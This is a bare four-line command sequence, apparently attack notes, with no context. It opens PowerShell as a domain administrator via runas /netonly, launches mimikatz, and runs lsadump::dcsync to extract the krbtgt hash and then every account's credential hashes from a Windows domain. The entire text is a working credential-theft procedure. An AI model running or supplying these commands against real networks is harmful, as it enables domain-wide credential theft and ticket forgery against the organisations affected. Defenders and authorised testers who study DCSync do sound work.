runas /netonly /user:mydomain\administrator powershell
C:\tools\mimikatz\x64\mimikatz.exe
lsadump::dcsync /domain:mydomain /user:krbtgt
lsadump::dcsync /domain:mydomain /all
